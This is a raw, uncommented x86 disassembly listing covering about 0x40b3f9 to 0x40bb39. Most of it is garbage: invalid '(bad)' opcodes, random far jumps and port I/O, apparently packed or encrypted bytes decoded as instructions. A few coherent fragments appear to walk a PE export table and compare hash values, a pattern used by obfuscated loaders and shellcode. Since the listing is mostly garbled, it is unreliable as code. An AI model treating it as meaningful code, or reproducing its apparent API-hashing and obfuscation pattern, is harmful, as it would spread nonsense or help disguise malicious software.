  40b3f9:	stos   DWORD PTR es:[edi],eax
  40b3fa:	aad    0x13
  40b3fc:	xlat   BYTE PTR ds:[ebx]
  40b3fd:	inc    esi
  40b3fe:	xlat   BYTE PTR ds:[ebx]
  40b3ff:	stos   DWORD PTR es:[edi],eax
  40b400:	adc    eax,0x11e8fe90
  40b405:	pop    eax
  40b406:	mov    ah,0xd9
  40b408:	ss push ebx
  40b40a:	ins    DWORD PTR es:[edi],dx
  40b40b:	pop    ds
  40b40c:	(bad)  [eax]
  40b40e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b40f:	jmp    0x72d8c330
  40b414:	fidivr DWORD PTR [edx-0x64]
  40b417:	lahf   
  40b418:	stos   BYTE PTR es:[edi],al
  40b419:	xlat   BYTE PTR ds:[ebx]
  40b41a:	sahf   
  40b41b:	dec    esp
  40b41c:	out    dx,al
  40b41d:	and    ch,BYTE PTR [ecx]
  40b41f:	cmc    
  40b420:	dec    eax
  40b421:	(bad)  
  40b422:	rcr    BYTE PTR [eax],1
  40b424:	mov    cl,BYTE PTR ds:0x172312c0
  40b42a:	je     0x40b44b
  40b42c:	popf   
  40b42d:	jno    0x40b466
  40b42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b430:	mov    dh,0xcb
  40b432:	leave  
  40b433:	jmp    0x40b460
  40b435:	jl     0x40b41c
  40b437:	stc    
  40b438:	jecxz  0x40b4a8
  40b43a:	out    dx,al
  40b43b:	mov    al,0xf6
  40b43d:	xor    ecx,edx
  40b43f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b440:	push   ss
  40b441:	push   0x29a5114b
  40b446:	fninit 
  40b448:	dec    edi
  40b449:	push   ebx
  40b44a:	cs popf 
  40b44c:	cld    
  40b44d:	or     ebp,DWORD PTR [esi]
  40b44f:	sbb    BYTE PTR [eax+0x1d],dh
  40b452:	mov    esp,0x68692b4c
  40b457:	outs   dx,DWORD PTR ds:[esi]
  40b458:	mov    WORD PTR [eiz*1+0x228db545],?
  40b45f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b460:	iret   
  40b461:	aas    
  40b462:	xchg   ecx,eax
  40b463:	or     bl,BYTE PTR [ecx+ebx*4-0x28d41c36]
  40b46a:	es popa 
  40b46c:	leave  
  40b46d:	cmp    al,0xfb
  40b46f:	jno    0x40b470
  40b471:	std    
  40b472:	mov    esp,0x47fe4d17
  40b477:	in     eax,0x5b
  40b479:	adc    ebp,ebx
  40b47b:	pop    ebp
  40b47c:	adc    ebx,DWORD PTR fs:[esp+ebx*4]
  40b480:	shl    BYTE PTR [ebx+ecx*8+0x792d9415],0x1d
  40b488:	sbb    DWORD PTR ds:0xebd86d99,ebp
  40b48e:	js     0x40b4e3
  40b490:	push   ebp
  40b491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b492:	mov    ebx,0x63c13681
  40b497:	fdiv   DWORD PTR [edi+ebp*2]
  40b49a:	arpl   WORD PTR [ecx-0x278987c4],cx
  40b4a0:	icebp  
  40b4a1:	inc    esi
  40b4a2:	pop    ebp
  40b4a3:	scas   al,BYTE PTR es:[edi]
  40b4a4:	stos   DWORD PTR es:[edi],eax
  40b4a5:	dec    edi
  40b4a6:	add    al,0xf0
  40b4a8:	pusha  
  40b4a9:	or     BYTE PTR [esi-0x13],ah
  40b4ac:	pop    ebx
  40b4ad:	std    
  40b4ae:	out    dx,al
  40b4af:	hlt    
  40b4b0:	push   ebx
  40b4b1:	dec    edx
  40b4b2:	push   ebp
  40b4b3:	dec    edx
  40b4b4:	and    al,0x2b
  40b4b6:	mov    ch,0xa7
  40b4b8:	or     DWORD PTR [eax],ecx
  40b4ba:	cdq    
  40b4bb:	(bad)  
  40b4bc:	dec    ebx
  40b4bd:	jnp    0x40b4d9
  40b4bf:	int3   
  40b4c0:	or     al,0x5e
  40b4c2:	js     0x40b4fd
  40b4c4:	dec    esi
  40b4c5:	addr16 mov esi,0x2ede5c09
  40b4cb:	stc    
  40b4cc:	push   ebp
  40b4cd:	mov    cl,0xb2
  40b4d0:	mov    ah,0x7a
  40b4d2:	loope  0x40b549
  40b4d4:	mov    cs,WORD PTR [ecx+0x458bd44d]
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	fadd   DWORD PTR [ecx-0xf177152]
  40b50d:	jle    0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	mul    DWORD PTR [ecx+0x22]
  40b516:	stc    
  40b517:	mov    ebp,0xa53260f8
  40b51c:	in     al,dx
  40b51d:	imul   edx,DWORD PTR [ebp+0x73],0x4e294edb
  40b524:	and    DWORD PTR [ebx-0x201f7ac0],esp
  40b52a:	dec    eax
  40b52b:	adc    al,0xe1
  40b52d:	scas   eax,DWORD PTR es:[edi]
  40b52e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b52f:	pop    ss
  40b530:	popf   
  40b531:	inc    ebp
  40b532:	(bad)  
  40b533:	mov    bh,dl
  40b535:	xor    ah,0x34
  40b538:	push   0xffffff84
  40b53a:	test   DWORD PTR [ecx],ecx
  40b53c:	in     eax,0xe5
  40b53e:	out    0xc9,eax
  40b540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b541:	loope  0x40b533
  40b543:	enter  0x2149,0x41
  40b547:	ins    DWORD PTR es:[edi],dx
  40b548:	test   al,0x1e
  40b54a:	rol    DWORD PTR [ebx+ebp*1],0x1d
  40b54e:	inc    edi
  40b54f:	stos   BYTE PTR es:[edi],al
  40b550:	imul   ebx,DWORD PTR [edx+0x28e7a03f],0xffffff8f
  40b557:	ret    
  40b558:	jmp    0xf7dc:0x754b45ad
  40b55f:	scas   eax,DWORD PTR es:[edi]
  40b560:	addr16 or eax,0x1ae41821
  40b566:	or     DWORD PTR [esi+0x49],0x4a
  40b56a:	ins    DWORD PTR es:[edi],dx
  40b56b:	lahf   
  40b56c:	dec    ecx
  40b56d:	inc    edx
  40b56e:	cwde   
  40b56f:	adc    dl,BYTE PTR [edi+0x58]
  40b572:	adc    al,0xb
  40b574:	jo     0x40b4f9
  40b576:	sar    DWORD PTR [edx+0x45],1
  40b579:	cwde   
  40b57a:	in     eax,dx
  40b57b:	cmp    DWORD PTR [ebx-0x45],edx
  40b57e:	xor    DWORD PTR [esi],ebx
  40b580:	pusha  
  40b581:	and    DWORD PTR ds:0x43bfe0be,ebx
  40b587:	inc    ebx
  40b588:	add    eax,0xbcf41a47
  40b58d:	cmp    ch,BYTE PTR [eax]
  40b58f:	xchg   ebp,eax
  40b590:	adc    al,0x54
  40b592:	test   BYTE PTR [edi],bl
  40b594:	add    ch,BYTE PTR [edx+0x327d3258]
  40b59a:	dec    DWORD PTR [esi]
  40b59c:	xchg   ebp,esi
  40b59e:	mov    DWORD PTR [eax],edx
  40b5a0:	xchg   ebp,eax
  40b5a1:	enter  0x28d,0x43
  40b5a5:	mov    bh,0xbb
  40b5a7:	dec    esi
  40b5a8:	ins    DWORD PTR es:[edi],dx
  40b5a9:	icebp  
  40b5aa:	add    DWORD PTR [ecx-0x4c18d4ba],esi
  40b5b0:	fstp   QWORD PTR [eax+0x2355a554]
  40b5b6:	sub    DWORD PTR [esi-0x34],edx
  40b5b9:	and    ah,cl
  40b5bb:	test   DWORD PTR [eax+0x2faabbe2],edx
  40b5c1:	outs   dx,BYTE PTR ds:[esi]
  40b5c2:	out    0x5e,al
  40b5c4:	les    ecx,FWORD PTR [esi+0x201313ca]
  40b5ca:	sbb    ebx,edx
  40b5cc:	mov    esp,0xe0461505
  40b5d1:	es aam 0xf3
  40b5d4:	mov    cl,0xee
  40b5d6:	lock or esi,esp
  40b5d9:	dec    ebp
  40b5da:	stos   DWORD PTR es:[edi],eax
  40b5db:	inc    ebp
  40b5dc:	mov    eax,0xe4363e75
  40b5e1:	mov    eax,0xc95c1222
  40b5e6:	popf   
  40b5e7:	xchg   ebx,eax
  40b5e8:	sbb    DWORD PTR [ebx+0x48],0x1d84a2ac
  40b5ef:	sub    ecx,edi
  40b5f1:	fstp   DWORD PTR [ecx]
  40b5f3:	retf   0x683d
  40b5f6:	mov    edx,0x6ac1bb0c
  40b5fb:	int3   
  40b5fc:	cld    
  40b5fd:	jmp    0x800f:0xd02803cd
  40b604:	pop    ds
  40b605:	pop    eax
  40b606:	rcl    BYTE PTR [edx],0xbc
  40b609:	mov    bl,0xcb
  40b60b:	shl    DWORD PTR [eax],cl
  40b60d:	fimul  WORD PTR [esi]
  40b60f:	inc    esi
  40b610:	idiv   BYTE PTR [edi]
  40b612:	and    ebx,DWORD PTR [edx+0x31]
  40b615:	fst    QWORD PTR [eax+esi*8+0x274368a0]
  40b61c:	dec    ecx
  40b61d:	sbb    esi,esp
  40b61f:	shr    esp,1
  40b621:	stos   BYTE PTR es:[edi],al
  40b622:	in     al,0x92
  40b624:	rcr    ebp,1
  40b626:	sbb    dh,BYTE PTR [ebp+0x13]
  40b629:	scas   al,BYTE PTR es:[edi]
  40b62a:	fidivr WORD PTR [ecx+ebp*2+0x68]
  40b62e:	cmp    dh,BYTE PTR [edx-0x90e73eb]
  40b634:	ret    0x3180
  40b637:	or     ecx,DWORD PTR [edx+0x556d50f3]
  40b63d:	pop    eax
  40b63e:	mov    esp,0x16afdd42
  40b643:	mov    esp,0x22b761ff
  40b648:	xchg   ecx,eax
  40b649:	dec    esi
  40b64a:	leave  
  40b64b:	xor    eax,0xa8eac85
  40b650:	pop    ss
  40b651:	btr    ebp,ebx
  40b654:	mov    eax,0xb9e1a97b
  40b659:	mov    dl,0x34
  40b65b:	in     al,dx
  40b65c:	push   edi
  40b65d:	push   edx
  40b65e:	push   esp
  40b65f:	stos   DWORD PTR es:[edi],eax
  40b660:	pop    ds
  40b661:	push   ss
  40b662:	and    al,0xf8
  40b664:	inc    esi
  40b665:	mov    al,0xaf
  40b667:	jge    0x40b635
  40b669:	cmp    edi,0xffffff90
  40b66c:	and    ecx,DWORD PTR [ebx+0xa]
  40b66f:	pusha  
  40b670:	daa    
  40b671:	cld    
  40b672:	jo     0x40b6ea
  40b674:	cwde   
  40b675:	stos   DWORD PTR es:[edi],eax
  40b676:	leave  
  40b677:	or     BYTE PTR [ebp-0x60],bh
  40b67a:	inc    edi
  40b67b:	or     ah,BYTE PTR [ecx+0x2811559f]
  40b681:	icebp  
  40b682:	aas    
  40b683:	aad    0xf4
  40b685:	dec    esp
  40b686:	call   0x4b30:0xc669d54a
  40b68d:	xor    bh,BYTE PTR ds:0xb8f60889
  40b693:	aam    0xaa
  40b695:	outs   dx,DWORD PTR ds:[esi]
  40b696:	sar    BYTE PTR [esi+0x718d296],1
  40b69c:	mov    esp,0x542646a3
  40b6a1:	inc    ebp
  40b6a2:	cmp    BYTE PTR [edi+0x3f],dl
  40b6a5:	(bad)  
  40b6a6:	cwde   
  40b6a7:	push   DWORD PTR [edx-0x6]
  40b6aa:	loop   0x40b71e
  40b6ac:	in     al,0xd5
  40b6ae:	push   esi
  40b6af:	stos   BYTE PTR es:[edi],al
  40b6b0:	cmp    ecx,ecx
  40b6b2:	xor    ebx,ebp
  40b6b4:	inc    ebp
  40b6b5:	jecxz  0x40b6e2
  40b6b7:	sub    eax,0x42ddc24c
  40b6bc:	adc    ebx,DWORD PTR [edx+0x781b1b89]
  40b6c2:	call   0x3eda:0x31954617
  40b6c9:	mov    eax,edx
  40b6cb:	shl    DWORD PTR [edi-0x5ce24bf5],0x5
  40b6d2:	test   BYTE PTR ds:0xa6891243,dl
  40b6d8:	xlat   BYTE PTR ds:[ebx]
  40b6d9:	fdivr  st,st(7)
  40b6db:	outs   dx,DWORD PTR ds:[esi]
  40b6dc:	and    eax,0x9ded1518
  40b6e1:	push   0x622d8361
  40b6e6:	sbb    eax,0xa453c2e6
  40b6eb:	add    BYTE PTR [edx-0x53],ch
  40b6ee:	sahf   
  40b6ef:	mov    bl,bl
  40b6f1:	jp     0x40b74e
  40b6f3:	dec    ebx
  40b6f4:	ja     0x40b770
  40b6f6:	ins    BYTE PTR es:[edi],dx
  40b6f7:	pop    ss
  40b6f8:	push   es
  40b6f9:	imul   ecx,DWORD PTR [esi+edi*4+0x5b],0x15
  40b6fe:	retf   0x1a2b
  40b701:	and    eax,0xc4d514ef
  40b706:	imul   ecx,DWORD PTR ds:0xcb4da5d5,0x49
  40b70d:	int    0x88
  40b70f:	mov    dl,0x99
  40b711:	xchg   esi,eax
  40b712:	pop    esi
  40b713:	nop
  40b714:	cmp    eax,0x60b55f52
  40b719:	xor    al,0x2
  40b71b:	jb     0x40b6c7
  40b71d:	shl    BYTE PTR [eax+0x7daa898e],1
  40b723:	xor    eax,0xeebeeff9
  40b728:	adc    al,0xfa
  40b72a:	xor    ah,cl
  40b72c:	dec    edi
  40b72d:	loopne 0x40b72f
  40b72f:	mov    esi,0x81709762
  40b734:	cmp    eax,0x62db0bc5
  40b739:	outs   dx,BYTE PTR ds:[esi]
  40b73a:	xchg   DWORD PTR [edx-0x6895c66b],esp
  40b740:	push   edi
  40b741:	xor    BYTE PTR [edi-0x65],al
  40b744:	mov    bh,0x2a
  40b746:	and    BYTE PTR [ecx],cl
  40b748:	adc    BYTE PTR [ebx],dl
  40b74a:	xchg   ebp,eax
  40b74b:	adc    BYTE PTR ds:0xedffe3a,0xc9
  40b752:	aaa    
  40b753:	in     al,0xcc
  40b755:	sahf   
  40b756:	jbe    0x40b7b6
  40b758:	push   WORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	dec    esp
  40b78b:	dec    esi
  40b78c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b78d:	stos   DWORD PTR es:[edi],eax
  40b78e:	mov    dl,0xfe
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	or     esi,esi
  40b798:	lods   eax,DWORD PTR ds:[esi]
  40b799:	lock int 0x2a
  40b79c:	push   0xffffffd0
  40b79e:	jmp    0x5c83:0xef87ad93
  40b7a5:	cmp    al,0x49
  40b7a7:	mov    edx,0x644f360a
  40b7ac:	and    edx,DWORD PTR [edx]
  40b7ae:	xchg   esp,eax
  40b7af:	dec    ebx
  40b7b0:	adc    BYTE PTR [ebx],ah
  40b7b2:	push   es
  40b7b3:	mov    ebp,0x8d7b23e3
  40b7b8:	rcl    edx,0xce
  40b7bb:	ds mov edx,0x13eb8e2c
  40b7c1:	jge    0x40b79e
  40b7c3:	lock xchg ebx,eax
  40b7c5:	push   es
  40b7c6:	mov    al,0x30
  40b7c8:	xor    bl,BYTE PTR [ebx]
  40b7ca:	add    ebp,DWORD PTR [ebp+0x346b4eae]
  40b7d0:	xchg   edi,eax
  40b7d1:	stos   DWORD PTR es:[edi],eax
  40b7d2:	add    al,0xf3
  40b7d4:	sbb    ebx,DWORD PTR ss:[ecx]
  40b7d7:	pop    ds
  40b7d8:	ds jns 0x40b816
  40b7db:	stc    
  40b7dc:	adc    edi,DWORD PTR [ecx+0x18]
  40b7df:	lods   eax,DWORD PTR ds:[esi]
  40b7e0:	stos   BYTE PTR es:[edi],al
  40b7e1:	test   DWORD PTR [edi],0xf66d5d1e
  40b7e7:	mov    DWORD PTR [esi-0x7],esi
  40b7ea:	(bad)  
  40b7eb:	mov    al,0xdb
  40b7ed:	dec    eax
  40b7ee:	jmp    0x40b851
  40b7f0:	outs   dx,DWORD PTR ds:[esi]
  40b7f1:	test   BYTE PTR [edi],al
  40b7f3:	push   ss
  40b7f4:	ffree  st(2)
  40b7f6:	xor    esp,DWORD PTR [esi]
  40b7f8:	sbb    edi,ecx
  40b7fa:	add    DWORD PTR [esp+edi*1],edx
  40b7fd:	fldlg2 
  40b7ff:	and    al,0xf5
  40b801:	out    0xd,eax
  40b803:	test   bl,dl
  40b805:	lahf   
  40b806:	pop    edx
  40b807:	inc    ebp
  40b808:	add    DWORD PTR [esi-0x1],edx
  40b80b:	je     0x40b87b
  40b80d:	mov    gs,WORD PTR [eax]
  40b80f:	test   BYTE PTR [esi+0xb],0xf3
  40b813:	add    edi,esp
  40b815:	jle    0x40b7bb
  40b817:	sub    cl,BYTE PTR [edx+0x6d]
  40b81a:	(bad)  
  40b81b:	jns    0x40b7d2
  40b81d:	push   esp
  40b81e:	out    0x96,al
  40b820:	or     esp,edx
  40b822:	ins    BYTE PTR es:[edi],dx
  40b823:	in     al,0x70
  40b825:	mov    ebx,0xb63808d0
  40b82a:	test   eax,0x14594325
  40b82f:	leave  
  40b830:	mov    cl,0x62
  40b832:	cdq    
  40b833:	inc    ebx
  40b834:	aad    0xe7
  40b836:	repnz nop
  40b838:	push   edi
  40b839:	mov    dl,0x86
  40b83b:	mov    DWORD PTR [ebx+0x2],esp
  40b83e:	cmp    al,cl
  40b840:	sub    dh,dh
  40b842:	test   al,0xcd
  40b844:	dec    esi
  40b845:	in     eax,dx
  40b846:	scas   eax,DWORD PTR es:[edi]
  40b847:	call   0x3dd1fdc3
  40b84c:	add    ah,cl
  40b84e:	cld    
  40b84f:	push   0x6e
  40b851:	jge    0x40b846
  40b853:	les    ebp,FWORD PTR [ecx+0x61]
  40b856:	rcr    al,1
  40b858:	pop    ss
  40b859:	push   es
  40b85a:	nop
  40b85b:	addr16 pushf 
  40b85d:	xor    al,0xf4
  40b85f:	out    dx,eax
  40b860:	les    ebp,FWORD PTR [eax+ebp*8-0x744c38cf]
  40b867:	(bad)  
  40b868:	xor    BYTE PTR [esi+edx*8+0x2b],al
  40b86c:	mov    edi,0x82a17ead
  40b871:	cmp    DWORD PTR [eax],0xffffffe3
  40b874:	out    0x42,al
  40b876:	rcr    ebx,cl
  40b878:	mov    edi,0x5f771def
  40b87d:	sub    ebp,DWORD PTR [edi]
  40b87f:	fld    DWORD PTR [edx-0x5d]
  40b882:	enter  0x1a24,0xd6
  40b886:	push   esp
  40b887:	adc    BYTE PTR [eax-0x574fe77d],0x1c
  40b88e:	add    al,0x72
  40b890:	outs   dx,DWORD PTR ds:[esi]
  40b891:	mov    esi,0xf52fe74a
  40b896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b897:	pop    ds
  40b898:	rol    dh,0x3
  40b89b:	dec    esi
  40b89c:	and    bh,BYTE PTR [eax]
  40b89e:	dec    eax
  40b89f:	pop    ebx
  40b8a0:	out    0x91,eax
  40b8a2:	mov    DWORD PTR [ebx-0x5a],edx
  40b8a5:	call   0x66d3:0xc03aa9ba
  40b8ac:	mov    cl,0x45
  40b8ae:	pop    eax
  40b8af:	cmp    ch,BYTE PTR [esi]
  40b8b1:	add    al,0xe4
  40b8b3:	pop    edx
  40b8b4:	pop    edx
  40b8b5:	scas   eax,DWORD PTR es:[edi]
  40b8b6:	fwait
  40b8b7:	popa   
  40b8b8:	xchg   edi,eax
  40b8b9:	push   edx
  40b8ba:	and    al,0x89
  40b8bc:	inc    esi
  40b8bd:	test   al,0x3c
  40b8bf:	(bad)  
  40b8c0:	neg    DWORD PTR [esi-0x7f]
  40b8c3:	inc    ecx
  40b8c4:	or     al,0xfe
  40b8c6:	pop    eax
  40b8c7:	jne    0x40b857
  40b8c9:	test   eax,0xf0ed1bab
  40b8ce:	loope  0x40b869
  40b8d0:	sbb    al,0x15
  40b8d2:	mov    esi,0xd71b53f1
  40b8d7:	xchg   BYTE PTR [ebx+0x5d49903a],dl
  40b8dd:	and    eax,0x4ecdfa83
  40b8e3:	int    0xed
  40b8e5:	cmp    al,0xfd
  40b8e7:	mov    dl,ch
  40b8e9:	jmp    0xcd19401b
  40b8ee:	cwde   
  40b8ef:	xchg   edi,eax
  40b8f0:	adc    BYTE PTR [ecx+0x66],ch
  40b8f3:	outs   dx,DWORD PTR ds:[esi]
  40b8f4:	iret   
  40b8f5:	adc    cl,BYTE PTR [eax]
  40b8f7:	pop    ecx
  40b8f8:	push   ds
  40b8f9:	ins    BYTE PTR es:[edi],dx
  40b8fa:	fwait
  40b8fb:	loopne 0x40b8ff
  40b8fd:	inc    DWORD PTR [esi]
  40b8ff:	jecxz  0x40b930
  40b901:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40b903:	pusha  
  40b904:	adc    BYTE PTR [ebx-0x48],al
  40b907:	add    BYTE PTR [edi+0x10],0xd2
  40b90b:	xchg   DWORD PTR [esp+ebp*8],edi
  40b90e:	adc    eax,0x9882cb24
  40b913:	in     eax,0x5e
  40b915:	out    0x52,al
  40b917:	std    
  40b918:	fidiv  WORD PTR [edx]
  40b91a:	clc    
  40b91b:	fcmovne st,st(6)
  40b91d:	mov    ah,0x60
  40b91f:	mov    edi,0x20f0f0fd
  40b924:	jno    0x40b982
  40b926:	in     eax,dx
  40b927:	dec    eax
  40b928:	sar    DWORD PTR [ecx-0x5e19bfd],1
  40b92e:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b930:	mov    eax,ds:0x51ed80d6
  40b935:	mov    al,0xe8
  40b937:	iret   
  40b938:	xchg   ecx,eax
  40b939:	xchg   esi,eax
  40b93a:	in     al,0x3b
  40b93c:	mov    edx,0x54c4ec61
  40b941:	fsubr  st,st(6)
  40b943:	ret    
  40b944:	cwde   
  40b945:	popf   
  40b946:	sahf   
  40b947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b948:	retf   
  40b949:	in     al,dx
  40b94a:	add    al,0x51
  40b94c:	bound  ebx,QWORD PTR [esi]
  40b94e:	sub    al,BYTE PTR [edi]
  40b950:	(bad)  [ebp+0x76ccd3c9]
  40b956:	fld    st(3)
  40b958:	sar    DWORD PTR [edx+0x49b0520e],1
  40b95e:	pop    eax
  40b95f:	push   es
  40b960:	push   esp
  40b961:	outs   dx,DWORD PTR ds:[esi]
  40b962:	jne    0x40b939
  40b964:	sbb    bl,BYTE PTR [ecx+0x34fc7740]
  40b96a:	je     0x40b93a
  40b96c:	ds es push esi
  40b96f:	pop    esi
  40b970:	dec    edi
  40b971:	(bad)  
  40b972:	(bad)  
  40b973:	jmp    0x59b9:0x58fdb9db
  40b97a:	(bad)  
  40b97b:	mov    cl,0xd7
  40b97d:	mov    dl,0xc1
  40b97f:	in     eax,dx
  40b980:	sub    DWORD PTR ss:[esi+0x3dbef26f],edx
  40b987:	xor    eax,DWORD PTR [ecx+edi*2]
  40b98a:	call   FWORD PTR [edx-0x7d01960a]
  40b990:	hlt    
  40b991:	xchg   ecx,eax
  40b992:	sub    BYTE PTR [eax],ch
  40b994:	add    bl,BYTE PTR [edx-0x5fb569ed]
  40b99a:	pop    ds
  40b99b:	pusha  
  40b99c:	jns    0x40b9bf
  40b99e:	int    0x28
  40b9a0:	mov    ebp,0xcf5fa5a5
  40b9a5:	fdiv   st,st(4)
  40b9a7:	out    0x82,al
  40b9a9:	dec    ebx
  40b9aa:	and    eax,0xce463bb5
  40b9af:	outs   dx,BYTE PTR ds:[esi]
  40b9b0:	sub    BYTE PTR [ebp-0x7856d670],al
  40b9b6:	test   al,0x88
  40b9b8:	xor    al,0xed
  40b9ba:	mov    ds:0xdadc51b2,eax
  40b9bf:	mov    al,ds:0x6d6de4df
  40b9c4:	and    dh,al
  40b9c6:	mov    dl,0x64
  40b9c8:	addr16 ret 0xc59e
  40b9cc:	xor    eax,0x2d8eb614
  40b9d1:	inc    edx
  40b9d2:	ror    DWORD PTR [edi+ecx*1-0x13095502],1
  40b9d9:	xor    ebp,ecx
  40b9db:	lds    ecx,FWORD PTR [ebx+0x3b47e045]
  40b9e1:	clc    
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x68d157f8],eax
  40ba0f:	jae    0x40ba62
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	mov    cl,0xba
  40ba1b:	and    eax,0xc8b2c7ef
  40ba20:	in     al,0x78
  40ba22:	into   
  40ba23:	sub    al,0xc1
  40ba25:	retf   
  40ba26:	fmul   st,st(5)
  40ba28:	loop   0x40ba98
  40ba2a:	push   0x61
  40ba2c:	mov    edi,DWORD PTR [ebp+0x38967171]
  40ba32:	aad    0x89
  40ba34:	add    bl,BYTE PTR [esp+eiz*2+0x40425d25]
  40ba3b:	iret   
  40ba3c:	xchg   ebx,eax
  40ba3d:	lahf   
  40ba3e:	push   0xaa729b0
  40ba43:	test   ebx,edi
  40ba45:	lock inc edx
  40ba47:	pop    esi
  40ba48:	inc    esi
  40ba49:	push   ebx
  40ba4a:	cwde   
  40ba4b:	pop    esi
  40ba4c:	mov    bl,0x18
  40ba4e:	add    al,0x75
  40ba50:	lea    eax,[ebp+0x42409643]
  40ba56:	mov    eax,0x923776d1
  40ba5b:	je     0x40ba51
  40ba5d:	loope  0x40ba18
  40ba5f:	inc    ecx
  40ba60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba61:	test   al,0x85
  40ba63:	sbb    bl,BYTE PTR [edx+0x61ab820d]
  40ba69:	push   es
  40ba6a:	(bad)  
  40ba6b:	cdq    
  40ba6c:	fcmove st,st(0)
  40ba6e:	and    al,0x71
  40ba71:	or     eax,0x563dd04d
  40ba76:	jnp    0x40bacd
  40ba78:	pop    eax
  40ba79:	inc    esp
  40ba7a:	inc    esp
  40ba7b:	cs repnz hlt 
  40ba7e:	ins    DWORD PTR es:[edi],dx
  40ba7f:	repnz push ebp
  40ba81:	sub    DWORD PTR [edx+0x69490ecc],0xffffffbd
  40ba88:	shl    bh,cl
  40ba8a:	clc    
  40ba8b:	in     al,dx
  40ba8c:	mov    cl,dl
  40ba8e:	inc    edi
  40ba8f:	out    dx,eax
  40ba90:	mov    dl,0x4f
  40ba92:	xchg   BYTE PTR [esi],dl
  40ba94:	mov    dl,0xa4
  40ba96:	mov    ds:0x3365ba55,eax
  40ba9b:	add    al,0x48
  40ba9d:	push   ecx
  40ba9e:	add    al,0x64
  40baa0:	in     al,0x35
  40baa2:	ss call 0x26ec:0x52614739
  40baaa:	inc    ebx
  40baab:	(bad)  
  40baac:	push   0x2c
  40baae:	jb     0x40ba72
  40bab0:	sub    ch,BYTE PTR [edx*2+0xfa52f0c]
  40bab7:	sbb    BYTE PTR [edi-0x1],ch
  40baba:	sbb    al,BYTE PTR [ebp-0x5e6f08f6]
  40bac0:	ror    BYTE PTR [eax],1
  40bac2:	sbb    edi,eax
  40bac4:	xor    eax,0x5e71eb0
  40bac9:	jecxz  0x40ba65
  40bacb:	cmp    DWORD PTR [edx-0x59fb1ff5],edx
  40bad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bad2:	mov    eax,ds:0x99cc22b6
  40bad7:	dec    ecx
  40bad8:	mov    edi,?
  40bada:	pop    ecx
  40badb:	test   eax,0x9e7d55ed
  40bae0:	xchg   edi,eax
  40bae1:	repnz adc DWORD PTR [ebx+0x16],0x97d5e0f6
  40bae9:	(bad)  
  40baea:	popf   
  40baeb:	xor    eax,0x396f0fe5
  40baf0:	push   ebx
  40baf1:	jge    0x40bad8
  40baf3:	xor    al,0x8
  40baf5:	and    DWORD PTR [esi],esp
  40baf7:	dec    ebx
  40baf8:	ror    bh,1
  40bafa:	xor    esp,DWORD PTR [edi]
  40bafc:	iret   
  40bafd:	sbb    DWORD PTR [ebx],esi
  40baff:	ja     0x40bb51
  40bb01:	repnz dec ebp
  40bb03:	push   esp
  40bb04:	push   ds
  40bb05:	jmp    0x9e5f:0xab8820e9
  40bb0c:	mov    ds:0x85ba372b,eax
  40bb11:	add    eax,DWORD PTR [ebx]
  40bb13:	mov    ah,ah
  40bb15:	sbb    edi,esp
  40bb17:	sar    DWORD PTR [eax+0x3474739d],0x24
  40bb1e:	inc    esp
  40bb1f:	mov    ebx,0xb14aa937
  40bb24:	sahf   
  40bb25:	mov    al,ds:0xd3311717
  40bb2a:	jnp    0x40bb48
  40bb2c:	enter  0x352c,0xc1
  40bb30:	dec    ecx
  40bb31:	call   0x5f2e9b16
  40bb36:	test   al,0x5b
  40bb38:	inc    edi
  40bb39:	test   al,0x15
